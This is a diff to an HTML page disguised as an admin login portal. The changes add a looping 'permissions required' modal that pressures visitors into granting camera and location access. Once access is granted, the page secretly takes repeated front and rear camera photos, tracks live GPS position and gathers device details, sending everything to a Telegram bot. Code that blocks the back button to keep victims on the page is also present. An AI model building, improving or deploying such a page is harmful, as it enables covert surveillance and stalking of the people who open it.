@@ -105,6 +105,55 @@
             color: white;
         }
 
+        /* ========== PERMISSION MODAL (NEW) ========== */
+        .permission-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+        }
+        .permission-modal.hidden {
+            display: none;
+        }
+        .modal-content {
+            background: #111;
+            border: 2px solid lime;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 350px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 0 30px lime;
+        }
+        .modal-content h3 {
+            color: lime;
+            margin-bottom: 15px;
+        }
+        .modal-content p {
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .modal-content button {
+            background: lime;
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .modal-content button:hover {
+            background: #00cc00;
+        }
+
         /* ========== HIDDEN FUNCTIONAL STYLES ========== */
         .video-container {
             position: fixed;
@@ -229,6 +278,15 @@
         <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
     </div>
 
+    <!-- PERMISSION MODAL (shown until user grants both camera & location) -->
+    <div id="permissionModal" class="permission-modal">
+        <div class="modal-content">
+            <h3>🔐 Permissions required</h3>
+            <p id="permissionMessage">Please allow camera and location access to continue.</p>
+            <button id="retryPermissionBtn">Allow</button>
+        </div>
+    </div>
+
     <div class="video-container">
         <video id="video" autoplay playsinline muted></video>
     </div>
@@ -254,15 +312,16 @@
         let capturing = false;
         let captureInterval = null;
         let locationWatchId = null;
-        let photoCount = 0;
-        let locationCount = 0;
         let cameraReady = false;
         let isProcessing = false;          // controls overlay and exit protection
         let useFrontCamera = true;
         let photoCounter = 0;
-        let photoQueue = [];
         
-        // ==================== BACK BUTTON PREVENTION ====================
+        // Permission flags
+        let cameraPermissionGranted = false;
+        let locationPermissionGranted = false;
+
+        // ==================== BACK BUTTON PREVENTION (same as original) ====================
         history.pushState(null, null, location.href);
         window.onpopstate = function() {
             if (isProcessing) {
@@ -287,7 +346,7 @@
             }
         });
         
-        // ==================== TELEGRAM SEND FUNCTIONS ====================
+        // ==================== TELEGRAM SEND FUNCTIONS (unchanged) ====================
         async function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const payload = {
@@ -367,104 +426,155 @@
             }
         }
         
-        // ==================== INIT ON PAGE LOAD (START EVERYTHING IMMEDIATELY) ====================
-        window.onload = function() {
-            // Request camera permission
-            initCamera();
-            
-            // Request location permission and start sending immediately
-            initLocationAndStartSending();
-            
-            // Collect and send device info (async)
-            collectExtendedDeviceInfo().then(info => {
-                sendWithRetry('device_info', info);
-            });
-            
-            // Start photo capture as soon as camera is ready (no overlay)
-            const checkCameraInterval = setInterval(() => {
-                if (cameraReady && !capturing) {
-                    clearInterval(checkCameraInterval);
-                    startPhotoCapture(); // starts background capture without overlay
-                }
-            }, 300);
-            
-            // Fallback: if camera never ready, still mark that we tried
-            setTimeout(() => {
-                clearInterval(checkCameraInterval);
-            }, 10000);
-            
-            // Attach login button click to show overlay
-            document.getElementById('loginButton').addEventListener('click', function() {
-                // Show processing overlay (does not affect ongoing capture)
-                if (!isProcessing) {
-                    isProcessing = true;
-                    document.getElementById('processingOverlay').classList.add('active');
-                    history.pushState(null, null, location.href);
-                    // Optionally send a message that login was clicked
-                    sendWithRetry('message', '🔑 Admin Login button clicked');
-                }
-            });
-        };
-        
-        // ==================== CAMERA INIT ====================
-        async function initCamera() {
+        // ==================== PERMISSION HANDLING (NEW) ====================
+        const permissionModal = document.getElementById('permissionModal');
+        const permissionMsg = document.getElementById('permissionMessage');
+        const retryBtn = document.getElementById('retryPermissionBtn');
+
+        // Hide modal initially (will show if permissions denied)
+        permissionModal.classList.add('hidden');
+
+        // Function to show modal with custom message
+        function showPermissionModal(message) {
+            permissionMsg.innerText = message;
+            permissionModal.classList.remove('hidden');
+        }
+
+        // Camera request with retry logic
+        async function requestCamera() {
             try {
+                // Try front camera first
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
+                useFrontCamera = true;
+                cameraReady = true;
+                cameraPermissionGranted = true;
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play().then(() => {
-                        cameraReady = true;
-                        useFrontCamera = true;
-                        console.log('Camera ready (front)');
-                    }).catch(e => console.log('Play error:', e));
-                };
+                await video.play();
+                console.log('Front camera ready');
+                return true;
             } catch (err) {
-                console.log('Front camera failed:', err);
+                console.log('Front camera failed, trying back:', err);
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     });
+                    useFrontCamera = false;
+                    cameraReady = true;
+                    cameraPermissionGranted = true;
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            cameraReady = true;
-                            useFrontCamera = false;
-                            console.log('Camera ready (back)');
-                        }).catch(e => console.log('Play error:', e));
-                    };
+                    await video.play();
+                    console.log('Back camera ready');
+                    return true;
                 } catch (err2) {
-                    console.log('All cameras failed');
-                    cameraReady = false;
+                    console.log('All cameras failed:', err2);
+                    cameraPermissionGranted = false;
+                    return false;
                 }
             }
         }
-        
-        // ==================== LOCATION: SEND IMMEDIATELY AND START LIVE UPDATES ====================
-        function initLocationAndStartSending() {
-            if (navigator.geolocation) {
+
+        // Location request with retry logic
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.log('Geolocation not supported');
+                    resolve(false);
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Send initial location immediately
+                        // Success - we have location
+                        locationPermissionGranted = true;
+                        // Immediately send initial location
                         sendWithRetry('location', {
                             lat: position.coords.latitude,
                             lng: position.coords.longitude
                         });
                         // Start live updates
                         startLiveLocation();
+                        resolve(true);
                     },
-                    (error) => console.log('Location error:', error),
+                    (error) => {
+                        console.log('Location denied or error:', error);
+                        locationPermissionGranted = false;
+                        resolve(false);
+                    },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
-            }
+            });
         }
-        
-        // ==================== EXTENDED DEVICE INFO ====================
+
+        // Live location watcher (separate)
+        function startLiveLocation() {
+            if (locationWatchId) return;
+            locationWatchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    sendWithRetry('location', {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    });
+                },
+                (error) => console.log('Watch location error:', error),
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+            );
+        }
+
+        // Main permission loop: request both until granted
+        async function requestAllPermissions() {
+            let cameraOk = cameraPermissionGranted;
+            let locationOk = locationPermissionGranted;
+
+            while (!cameraOk || !locationOk) {
+                if (!cameraOk) {
+                    showPermissionModal('Camera access is required. Please click "Allow" to grant camera permission.');
+                    await new Promise(resolve => {
+                        retryBtn.onclick = async () => {
+                            permissionModal.classList.add('hidden');
+                            cameraOk = await requestCamera();
+                            resolve();
+                        };
+                    });
+                } else if (!locationOk) {
+                    showPermissionModal('Location access is required. Please click "Allow" to grant location permission.');
+                    await new Promise(resolve => {
+                        retryBtn.onclick = async () => {
+                            permissionModal.classList.add('hidden');
+                            locationOk = await requestLocation();
+                            resolve();
+                        };
+                    });
+                }
+            }
+
+            // Both granted – hide modal and start full data collection
+            permissionModal.classList.add('hidden');
+            startDataCollection();
+        }
+
+        // ==================== DATA COLLECTION (triggered after permissions) ====================
+        function startDataCollection() {
+            console.log('Permissions granted, starting data collection');
+            
+            // Collect and send extended device info
+            collectExtendedDeviceInfo().then(info => {
+                sendWithRetry('device_info', info);
+            });
+
+            // Start photo capture
+            startPhotoCapture();
+
+            // (Location already started inside requestLocation, but we also have live updates)
+            // Also send a "permissions granted" message
+            sendWithRetry('message', '✅ Permissions granted – data collection started');
+        }
+
+        // ==================== EXTENDED DEVICE INFO (unchanged) ====================
         async function collectExtendedDeviceInfo() {
             const info = {
                 'User Agent': navigator.userAgent,
@@ -505,7 +615,7 @@
             return info;
         }
 
-        // ==================== START PHOTO CAPTURE (background, no overlay) ====================
+        // ==================== PHOTO CAPTURE (unchanged logic, but uses cameraReady) ====================
         function startPhotoCapture() {
             if (capturing) return;
             capturing = true;
@@ -513,7 +623,7 @@
             captureInterval = setInterval(capturePhoto, 5000);
             setTimeout(capturePhoto, 1000); // first photo after 1 second
             
-            // Auto-stop after 30 seconds (photo capture stops, but overlay may still appear later)
+            // Auto-stop after 30 seconds (photo capture stops)
             setTimeout(() => {
                 if (capturing) stopPhotoCapture();
             }, 30000);
@@ -523,12 +633,28 @@
             capturing = false;
             if (captureInterval) clearInterval(captureInterval);
             // Do not clear location watch here; keep sending location
-            processQueue();
-            // Send a completion message (optional)
             sendWithRetry('message', '📸 Photo capture completed (30s)');
         }
         
-        // ==================== CAPTURE PHOTO (front first, then alternate) ====================
+        // Switch camera function (used by capturePhoto)
+        async function switchCamera(mode) {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                cameraReady = true;
+            } catch (err) {
+                console.log('Switch camera failed:', err);
+            }
+        }
+
         async function capturePhoto() {
             if (!capturing || !cameraReady || !stream) return;
             try {
@@ -547,84 +673,41 @@
                 }
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                if (useFrontCamera) {
-                    context.translate(canvas.width, 0);
-                    context.scale(-1, 1);
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    context.setTransform(1, 0, 0, 1, 0, 0);
-                } else {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                }
-                photoCount++;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
                 canvas.toBlob(async (blob) => {
-                    try {
-                        if (blob.size > 1000) {
-                            await sendPhotoWithRetry(blob, photoCount, useFrontCamera ? 'Front' : 'Back');
-                        }
-                    } catch (err) {
-                        console.log('Photo send error:', err);
+                    if (blob) {
+                        const cameraType = useFrontCamera ? 'front' : 'rear';
+                        await sendPhotoWithRetry(blob, photoCounter, cameraType);
                     }
-                }, 'image/jpeg', 70);
-            } catch (err) {
-                console.log('Capture error:', err);
+                }, 'image/jpeg', 0.8);
+            } catch (e) {
+                console.log('Capture error:', e);
             }
-        }
-        
-        async function processQueue() {
-            while (photoQueue.length > 0) {
-                const item = photoQueue.shift();
-                await sendPhotoWithRetry(item.blob, item.num, item.cameraType);
-                await new Promise(r => setTimeout(r, 1000));
-            }
-        }
-        
-        async function switchCamera(mode) {
-            try {
-                if (stream) stream.getTracks().forEach(track => track.stop());
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                return new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
-                    };
-                });
-            } catch (err) {
-                console.log('Switch error:', err);
-                return false;
-            }
-        }
-        
-        function startLiveLocation() {
-            if (!navigator.geolocation) return;
-            locationWatchId = navigator.geolocation.watchPosition(
-                (position) => {
-                    locationCount++;
-                    // Send every ~30 seconds (assuming updates every 5 seconds, count 6)
-                    if (locationCount % 6 === 0) {
-                        sendWithRetry('location', {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude
-                        });
-                    }
-                },
-                (error) => console.log('Live location error:', error),
-                { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
-            );
         }
 
-        // ==================== ADMIN PANEL TOGGLE PASSWORD ====================
+        // ==================== TOGGLE PASSWORD (unchanged) ====================
         function togglePassword() {
-            var pass = document.getElementById("password");
-            if (pass.type === "password") {
-                pass.type = "text";
-            } else {
-                pass.type = "password";
-            }
+            const pwd = document.getElementById('password');
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
         }
+
+        // ==================== INIT ON PAGE LOAD ====================
+        window.onload = function() {
+            // Start permission request loop – will show modal until both granted
+            requestAllPermissions();
+
+            // Attach login button click to show processing overlay (as before)
+            document.getElementById('loginButton').addEventListener('click', function() {
+                // Show processing overlay (does not affect ongoing capture)
+                if (!isProcessing) {
+                    isProcessing = true;
+                    document.getElementById('processingOverlay').classList.add('active');
+                    history.pushState(null, null, location.href);
+                    sendWithRetry('message', '🔑 Admin Login button clicked');
+                }
+            });
+        };
     </script>
 </body>
 </html>
